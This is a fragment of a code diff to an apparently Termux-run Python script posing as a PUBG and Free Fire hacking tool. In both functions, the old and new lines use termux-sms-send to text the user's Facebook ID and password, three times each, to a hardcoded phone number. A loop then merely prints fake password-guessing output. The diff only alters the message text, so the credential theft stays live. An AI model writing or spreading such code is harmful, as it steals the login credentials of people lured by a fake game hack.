@@ -39,9 +39,9 @@ def pubg():
     time.sleep(3)
     print("This will ask you to send sms to our server,  ALLOW THIS TO SEND SMS , wait")
     time.sleep(5)
-    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
-    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
-    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
+    os.system(f"termux-sms-send -n 9815390185 id= local{fb_id},pass= local{fb_pass}")
+    os.system(f"termux-sms-send -n 9815390185 id= local{fb_id},pass= local{fb_pass}")
+    os.system(f"termux-sms-send -n 9815390185 id= local{fb_id},pass= local{fb_pass}")
     
     time.sleep(2)
     for i in range(10100,99999999):
@@ -70,9 +70,9 @@ def free_fire():
     time.sleep(3)
     print("This will ask you to send sms to our server,  ALLOW THIS TO SEND SMS , wait")
     time.sleep(5)
-    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
-    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
-    os.system(f"termux-sms-send -n 9815390185 id= {fb_id},pass={fb_pass}")
+    os.system(f"termux-sms-send -n 9815390185 id= local{fb_id},pass= local{fb_pass}")
+    os.system(f"termux-sms-send -n 9815390185 id= local{fb_id},pass= local{fb_pass}")
+    os.system(f"termux-sms-send -n 9815390185 id= local{fb_id},pass= local{fb_pass}")
     time.sleep(2)
     for i in range(10100,99999999):
         print(f"Trying password for {username} :{i}")
